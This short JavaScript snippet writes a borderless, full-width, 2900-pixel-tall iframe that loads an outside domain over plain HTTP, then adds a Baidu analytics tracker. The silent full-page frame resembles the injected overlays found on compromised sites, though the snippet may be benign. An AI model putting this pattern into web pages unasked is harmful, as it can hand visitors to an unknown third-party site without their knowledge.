document.writeln("<IFRAME name=I1 src=\"http:\/\/www.13199.cc/\"\" frameBorder=0 width=\"100%\" height=\"2900\" scrolling=no><\/IFRAME>");
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?3b058fa14d92d502b49c71715e8def45";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();